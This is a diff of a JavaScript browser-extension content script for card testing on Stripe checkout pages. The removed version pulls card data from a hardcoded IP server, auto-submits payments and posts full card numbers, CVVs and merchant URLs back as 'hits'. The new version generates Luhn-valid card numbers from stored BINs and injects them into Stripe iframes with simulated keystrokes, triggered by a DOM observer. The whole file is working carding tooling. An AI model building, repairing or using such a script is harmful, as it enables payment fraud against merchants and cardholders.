@@ -2,176 +2,253 @@ console.log("💳 Card Injection Script Loaded");
 
 // Configuration
 const INJECTION_CONFIG = {
-    API: {
-        BASE_URL: 'http://46.202.163.22:3000',
-        ENDPOINTS: {
-            BIN_INFO: '/bin/',
-            HITS: '/api/hits'
-        },
-        TIMEOUT: 10000
+    STORAGE: {
+        KEYS: {
+            PRIMARY_BIN: 'primaryBIN',
+            SECONDARY_BIN: 'secondaryBIN',
+            CURRENT_BIN: 'currentBIN',
+            EXTENSION_ENABLED: 'extensionEnabled'
+        }
     },
-    SELECTORS: {
-        STRIPE: {
+    STRIPE: {
+        FRAME_SELECTORS: {
             NUMBER: [
-                'iframe[name*="__privateStripeFrame"][name*="card"]',
+                'iframe[name*="__privateStripeFrame"][name*="cardNumber"]',
                 'iframe[name*="__privateStripeElement"][name*="cardNumber"]',
-                'input[data-elements-stable-field-name*="cardNumber"]'
+                'iframe[title*="Card number"]',
+                'iframe[id*="card-number"]'
             ],
             EXPIRY: [
                 'iframe[name*="__privateStripeFrame"][name*="exp"]',
                 'iframe[name*="__privateStripeElement"][name*="expiry"]',
-                'input[data-elements-stable-field-name*="cardExpiry"]'
+                'iframe[title*="expiration date"]'
             ],
             CVC: [
                 'iframe[name*="__privateStripeFrame"][name*="cvc"]',
                 'iframe[name*="__privateStripeElement"][name*="cvc"]',
-                'input[data-elements-stable-field-name*="cardCvc"]'
+                'iframe[title*="security code"]'
             ]
         },
-        SUBMIT: [
-            'button[type="submit"]',
-            'button.SubmitButton',
-            '[data-submit="true"]',
-            'button:contains("Pay")',
-            'button:contains("Subscribe")',
-            '[data-testid*="submit"]'
-        ],
-        AMOUNT: [
-            '[data-testid*="amount"]',
-            '.Price',
-            '.amount',
-            '[class*="price"]',
-            'span:contains("$")'
-        ]
-    },
-    TIMING: {
-        INITIAL_DELAY: 1000,
-        FORM_CHECK_INTERVAL: 500,
-        INJECTION_DELAY: 100,
-        SUBMIT_DELAY: 1000,
-        MAX_RETRIES: 3
+        INPUT_SELECTORS: {
+            NUMBER: 'input[data-elements-stable-field-name="cardNumber"]',
+            EXPIRY: 'input[data-elements-stable-field-name="cardExpiry"]',
+            CVC: 'input[data-elements-stable-field-name="cardCvc"]'
+        },
+        TIMING: {
+            INITIAL_DELAY: 800,
+            FRAME_CHECK_INTERVAL: 300,
+            INJECTION_DELAY: 50,
+            MAX_RETRIES: 5,
+            FRAME_READY_TIMEOUT: 2000
+        }
     }
 };
 
-// Card Generation System
-const CardSystem = {
-    async generateCard(bin) {
+// Storage Manager
+const StorageManager = {
+    async getBINs() {
         try {
-            const response = await fetch(`${INJECTION_CONFIG.API.BASE_URL}${INJECTION_CONFIG.API.ENDPOINTS.BIN_INFO}${bin}`, {
-                method: 'GET',
-                headers: { 'Accept': 'application/json' },
-                timeout: INJECTION_CONFIG.API.TIMEOUT
+            const result = await new Promise((resolve) => {
+                chrome.storage.local.get([
+                    INJECTION_CONFIG.STORAGE.KEYS.PRIMARY_BIN,
+                    INJECTION_CONFIG.STORAGE.KEYS.SECONDARY_BIN,
+                    INJECTION_CONFIG.STORAGE.KEYS.EXTENSION_ENABLED,
+                    INJECTION_CONFIG.STORAGE.KEYS.CURRENT_BIN
+                ], resolve);
             });
 
-            if (!response.ok) throw new Error('Card generation failed');
-
-            const cardData = await response.json();
-            if (!this.validateCard(cardData)) {
-                throw new Error('Invalid card data received');
+            if (!result[INJECTION_CONFIG.STORAGE.KEYS.EXTENSION_ENABLED]) {
+                throw new Error('Extension is disabled');
             }
 
-            return cardData;
+            if (!result[INJECTION_CONFIG.STORAGE.KEYS.PRIMARY_BIN] && !result[INJECTION_CONFIG.STORAGE.KEYS.SECONDARY_BIN]) {
+                throw new Error('No BINs provided');
+            }
+
+            return {
+                primaryBin: result[INJECTION_CONFIG.STORAGE.KEYS.PRIMARY_BIN],
+                secondaryBin: result[INJECTION_CONFIG.STORAGE.KEYS.SECONDARY_BIN],
+                currentBin: result[INJECTION_CONFIG.STORAGE.KEYS.CURRENT_BIN] || 'primary'
+            };
         } catch (error) {
-            console.error('Card generation error:', error);
-            return null;
+            console.error('Failed to get BINs:', error.message);
+            throw error;
         }
     },
 
-    validateCard(card) {
-        if (!card) return false;
-        
-        const { number, month, year, cvv } = card;
-        const now = new Date();
-        const currentYear = now.getFullYear();
-        
-        return (
-            /^\d{16}$/.test(number) &&
-            /^(0[1-9]|1[0-2])$/.test(month.toString()) &&
-            parseInt(year) >= currentYear &&
-            parseInt(year) <= currentYear + 10 &&
-            /^\d{3,4}$/.test(cvv)
-        );
+    async getNextBIN() {
+        const bins = await this.getBINs();
+        const nextBin = bins.currentBin === 'primary' ? 
+            (bins.secondaryBin || bins.primaryBin) : 
+            bins.primaryBin;
+
+        await this.saveCurrentBin(nextBin === bins.primaryBin ? 'primary' : 'secondary');
+        return nextBin;
+    },
+
+    async saveCurrentBin(type) {
+        return new Promise((resolve) => {
+            chrome.storage.local.set({ 
+                [INJECTION_CONFIG.STORAGE.KEYS.CURRENT_BIN]: type 
+            }, resolve);
+        });
     }
 };
 
-// Stripe Element Handler
-const StripeHandler = {
-    async injectIntoFrame(frame, value, fieldType) {
+// Card Generator
+const CardGenerator = {
+    generateLuhn(partial) {
+        let sum = 0;
+        let isEven = false;
+        
+        for (let i = partial.length - 1; i >= 0; i--) {
+            let digit = parseInt(partial[i]);
+            
+            if (isEven) {
+                digit *= 2;
+                if (digit > 9) digit -= 9;
+            }
+            
+            sum += digit;
+            isEven = !isEven;
+        }
+        
+        const checkDigit = (Math.ceil(sum / 10) * 10 - sum) % 10;
+        return partial + checkDigit;
+    },
+
+    async generateCard() {
         try {
-            const doc = frame.contentDocument || frame.contentWindow?.document;
-            if (!doc) return false;
+            const bin = await StorageManager.getNextBIN();
+            if (!bin) throw new Error('No valid BIN available');
 
-            const input = doc.querySelector('input[class*="InputElement"]');
-            if (!input) return false;
+            const remainingLength = 16 - bin.length;
+            const randomDigits = Array.from(
+                { length: remainingLength - 1 },
+                () => Math.floor(Math.random() * 10)
+            ).join('');
 
-            // Clear and focus
-            input.focus();
-            input.value = '';
-            input.dispatchEvent(new Event('change', { bubbles: true }));
+            const now = new Date();
+            const month = Math.floor(Math.random() * 12) + 1;
+            const year = now.getFullYear() + Math.floor(Math.random() * 5) + 1;
 
-            // Inject character by character
-            for (const char of value.toString()) {
-                input.value += char;
-                
-                ['keydown', 'keypress', 'keyup', 'input', 'change'].forEach(eventType => {
-                    input.dispatchEvent(new KeyboardEvent(eventType, {
-                        key: char,
-                        keyCode: char.charCodeAt(0),
-                        which: char.charCodeAt(0),
-                        bubbles: true,
-                        cancelable: true
-                    }));
-                });
-
-                await new Promise(r => setTimeout(r, INJECTION_CONFIG.TIMING.INJECTION_DELAY));
-            }
-
-            // Final events
-            input.dispatchEvent(new Event('blur', { bubbles: true }));
-            input.dispatchEvent(new CustomEvent('stripeElementUpdate', {
-                bubbles: true,
-                detail: { complete: true, value }
-            }));
-
-            return true;
+            return {
+                number: this.generateLuhn(bin + randomDigits),
+                month: month,
+                year: year,
+                cvv: Array.from({ length: 3 }, () => Math.floor(Math.random() * 10)).join('')
+            };
         } catch (error) {
-            console.warn(`Frame injection failed for ${fieldType}:`, error);
-            return false;
+            console.error('Card generation failed:', error.message);
+            throw error;
         }
-    },
-
-    findPayButton() {
-        for (const selector of INJECTION_CONFIG.SELECTORS.SUBMIT) {
-            const button = document.querySelector(selector);
-            if (button && button.offsetParent !== null) {
-                return button;
-            }
-        }
-        return null;
-    },
-
-    getAmount() {
-        for (const selector of INJECTION_CONFIG.SELECTORS.AMOUNT) {
-            const element = document.querySelector(selector);
-            if (element) {
-                const text = element.innerText;
-                const match = text.match(/\$?\d+(\.\d{2})?/);
-                if (match) return match[0].replace('$', '');
-            }
-        }
-        return '0.00';
-    },
-
-    async submitPayment() {
-        const button = this.findPayButton();
-        if (!button) return false;
-
-        button.click();
-        return true;
     }
 };
 
-// Automated Payment Handler
+// Enhanced Stripe Handler
+const StripeHandler = {
+    async waitForFrame(selectors) {
+        return new Promise((resolve) => {
+            const checkFrame = () => {
+                for (const selector of selectors) {
+                    const frame = document.querySelector(selector);
+                    if (frame) {
+                        resolve(frame);
+                        return;
+                    }
+                }
+                setTimeout(checkFrame, INJECTION_CONFIG.STRIPE.TIMING.FRAME_CHECK_INTERVAL);
+            };
+            checkFrame();
+        });
+    },
+
+    async waitForFrameLoad(frame) {
+        return new Promise((resolve, reject) => {
+            const timeout = setTimeout(() => {
+                reject(new Error('Frame load timeout'));
+            }, INJECTION_CONFIG.STRIPE.TIMING.FRAME_READY_TIMEOUT);
+
+            const checkFrame = () => {
+                try {
+                    const doc = frame.contentDocument || frame.contentWindow?.document;
+                    if (doc) {
+                        clearTimeout(timeout);
+                        resolve(doc);
+                    } else {
+                        setTimeout(checkFrame, 100);
+                    }
+                } catch (e) {
+                    clearTimeout(timeout);
+                    reject(new Error('Cross-origin frame access denied'));
+                }
+            };
+            checkFrame();
+        });
+    },
+
+    async injectIntoFrame(frame, value, fieldType) {
+        let attempts = 0;
+        const maxAttempts = INJECTION_CONFIG.STRIPE.TIMING.MAX_RETRIES;
+
+        while (attempts < maxAttempts) {
+            try {
+                const doc = await this.waitForFrameLoad(frame);
+                const input = doc.querySelector('input[class*="InputElement"]');
+                if (!input) throw new Error('Input element not found');
+
+                // Clear and focus
+                input.focus();
+                input.value = '';
+                input.dispatchEvent(new Event('change', { bubbles: true }));
+                await new Promise(r => setTimeout(r, 50));
+
+                // Type value
+                for (const char of value.toString()) {
+                    input.value += char;
+                    
+                    const events = ['keydown', 'keypress', 'keyup', 'input', 'change'];
+                    for (const event of events) {
+                        input.dispatchEvent(new KeyboardEvent(event, {
+                            key: char,
+                            code: `Digit${char}`,
+                            keyCode: char.charCodeAt(0),
+                            which: char.charCodeAt(0),
+                            bubbles: true,
+                            cancelable: true,
+                            composed: true
+                        }));
+                        await new Promise(r => setTimeout(r, 5));
+                    }
+                }
+
+                // Verify injection
+                if (input.value !== value.toString()) {
+                    throw new Error('Value verification failed');
+                }
+
+                // Final events
+                input.dispatchEvent(new Event('blur', { bubbles: true }));
+                input.dispatchEvent(new CustomEvent('stripeElementUpdate', {
+                    bubbles: true,
+                    detail: { complete: true, value }
+                }));
+
+                return true;
+
+            } catch (error) {
+                console.warn(`Injection attempt ${attempts + 1} failed for ${fieldType}:`, error.message);
+                attempts++;
+                if (attempts < maxAttempts) {
+                    await new Promise(r => setTimeout(r, 500 * Math.pow(2, attempts)));
+                }
+            }
+        }
+        throw new Error(`Frame injection failed for ${fieldType} after ${maxAttempts} attempts`);
+    }
+};
+
+// Auto Payment Handler
 const AutoPayment = {
     isProcessing: false,
 
@@ -180,95 +257,79 @@ const AutoPayment = {
         this.isProcessing = true;
 
         try {
-            await this.waitForForm();
-            const card = await CardSystem.generateCard("424242");
-            
-            if (!card) {
-                throw new Error('Card generation failed');
+            const frames = await this.detectStripeForm();
+            if (!frames) {
+                throw new Error('Stripe form not found');
             }
 
+            const card = await CardGenerator.generateCard();
             console.log('💳 Generated card:', {
                 number: card.number.replace(/(\d{6})\d{6}(\d{4})/, '$1******$2'),
                 expiry: `${card.month}/${card.year}`,
                 cvv: '***'
             });
 
-            const success = await this.injectCardDetails(card);
-            if (!success) throw new Error('Card injection failed');
+            await this.injectCardDetails(frames, card);
+            console.log('✅ Card details injected successfully');
 
-            // Wait before submitting
-            await new Promise(r => setTimeout(r, INJECTION_CONFIG.TIMING.SUBMIT_DELAY));
-            
-            const submitted = await StripeHandler.submitPayment();
-            if (!submitted) throw new Error('Payment submission failed');
-
-            // Record hit
-            await this.recordHit(card);
-
-            console.log('✅ Payment process completed');
         } catch (error) {
-            console.error('❌ Payment process failed:', error);
+            console.error('❌ Payment process failed:', error.message);
         } finally {
             this.isProcessing = false;
         }
     },
 
-    async waitForForm() {
-        let attempts = 0;
-        while (attempts < INJECTION_CONFIG.TIMING.MAX_RETRIES) {
-            const frames = document.querySelectorAll('iframe[name*="__privateStripeFrame"]');
-            if (frames.length > 0) return true;
-            
-            await new Promise(r => setTimeout(r, INJECTION_CONFIG.TIMING.FORM_CHECK_INTERVAL));
-            attempts++;
-        }
-        throw new Error('Stripe form not found');
-    },
-
-    async injectCardDetails(card) {
-        const frames = document.querySelectorAll('iframe');
-        let success = { number: false, expiry: false, cvc: false };
-
-        for (const frame of frames) {
-            try {
-                if (frame.name.includes('cardNumber') && !success.number) {
-                    success.number = await StripeHandler.injectIntoFrame(frame, card.number, 'number');
-                }
-                else if (frame.name.includes('exp') && !success.expiry) {
-                    const expiry = `${card.month.toString().padStart(2, '0')}${card.year.toString().slice(-2)}`;
-                    success.expiry = await StripeHandler.injectIntoFrame(frame, expiry, 'expiry');
-                }
-                else if (frame.name.includes('cvc') && !success.cvc) {
-                    success.cvc = await StripeHandler.injectIntoFrame(frame, card.cvv, 'cvc');
-                }
-            } catch (error) {
-                console.warn('Frame injection error:', error);
-            }
-        }
-
-        return Object.values(success).every(Boolean);
-    },
-
-    async recordHit(card) {
+    async detectStripeForm() {
         try {
-            const amount = StripeHandler.getAmount();
-            await fetch(`${INJECTION_CONFIG.API.BASE_URL}${INJECTION_CONFIG.API.ENDPOINTS.HITS}`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    cardDetails: {
-                        cardNumber: card.number,
-                        expiryMonth: card.month,
-                        expiryYear: card.year,
-                        cvv: card.cvv
-                    },
-                    amount: amount,
-                    businessUrl: window.location.href,
-                    timestamp: new Date().toISOString()
-                })
-            });
+            const numberFrame = await StripeHandler.waitForFrame(INJECTION_CONFIG.STRIPE.FRAME_SELECTORS.NUMBER);
+            const expiryFrame = await StripeHandler.waitForFrame(INJECTION_CONFIG.STRIPE.FRAME_SELECTORS.EXPIRY);
+            const cvcFrame = await StripeHandler.waitForFrame(INJECTION_CONFIG.STRIPE.FRAME_SELECTORS.CVC);
+
+            return {
+                number: numberFrame,
+                expiry: expiryFrame,
+                cvc: cvcFrame
+            };
         } catch (error) {
-            console.error('Failed to record hit:', error);
+            console.error('Failed to detect Stripe form:', error);
+            return null;
+        }
+    },
+
+    async injectCardDetails(frames, card) {
+        const tasks = [];
+
+        // Card Number
+        if (frames.number) {
+            tasks.push(
+                StripeHandler.injectIntoFrame(frames.number, card.number, 'card number')
+                    .then(() => true)
+                    .catch(() => false)
+            );
+        }
+
+        // Expiry
+        if (frames.expiry) {
+            const expiry = `${card.month.toString().padStart(2, '0')}${card.year.toString().slice(-2)}`;
+            tasks.push(
+                StripeHandler.injectIntoFrame(frames.expiry, expiry, 'expiry')
+                    .then(() => true)
+                    .catch(() => false)
+            );
+        }
+
+        // CVC
+        if (frames.cvc) {
+            tasks.push(
+                StripeHandler.injectIntoFrame(frames.cvc, card.cvv, 'cvc')
+                    .then(() => true)
+                    .catch(() => false)
+            );
+        }
+
+        const results = await Promise.all(tasks);
+        if (!results.every(Boolean)) {
+            throw new Error('Failed to inject all card details');
         }
     }
 };
@@ -276,30 +337,57 @@ const AutoPayment = {
 // Form Observer
 const FormObserver = {
     init() {
-        // Start checking for form immediately
-        setTimeout(() => AutoPayment.start(), INJECTION_CONFIG.TIMING.INITIAL_DELAY);
+        setTimeout(() => {
+            this.initialize();
+        }, INJECTION_CONFIG.STRIPE.TIMING.INITIAL_DELAY);
+    },
 
-        // Watch for dynamic form loading
+    initialize() {
         const observer = new MutationObserver((mutations) => {
-            mutations.forEach((mutation) => {
-                if (mutation.addedNodes.length) {
-                    const hasStripeFrame = Array.from(mutation.addedNodes).some(node => 
-                        node.nodeType === 1 && (
-                            node.matches?.('iframe[name*="__privateStripeFrame"]') ||
-                            node.querySelector?.('iframe[name*="__privateStripeFrame"]')
-                        )
-                    );
-                    
-                    if (hasStripeFrame) {
-                        AutoPayment.start();
-                    }
-                }
-            });
+            if (!AutoPayment.isProcessing && this.shouldProcessMutations(mutations)) {
+                AutoPayment.start();
+            }
         });
 
-        observer.observe(document.body, {
-            childList: true,
-            subtree: true
+        if (document.body) {
+            observer.observe(document.body, {
+                childList: true,
+                subtree: true,
+                attributes: true,
+                attributeFilter: ['src', 'name', 'title']
+            });
+        }
+
+        // Initial check
+        AutoPayment.start();
+    },
+
+    shouldProcessMutations(mutations) {
+        return mutations.some(mutation => {
+            // Check for added nodes
+            if (mutation.addedNodes.length) {
+                return Array.from(mutation.addedNodes).some(node => {
+                    if (node.nodeType !== 1) return false;
+                    
+                    // Check if it's a Stripe iframe or contains one
+                    const isStripeFrame = node.tagName === 'IFRAME' && 
+                        (node.src?.includes('js.stripe.com') || 
+                         node.name?.includes('__privateStripeFrame'));
+                         
+                    if (isStripeFrame) return true;
+                    
+                    // Check for nested frames
+                    return !!node.querySelector(
+                        INJECTION_CONFIG.STRIPE.FRAME_SELECTORS.NUMBER.join(',')
+                    );
+                });
+            }
+
+            // Check attribute changes on iframes
+            return mutation.type === 'attributes' && 
+                   mutation.target.tagName === 'IFRAME' &&
+                   (mutation.target.src?.includes('js.stripe.com') ||
+                    mutation.target.name?.includes('__privateStripeFrame'));
         });
     }
 };
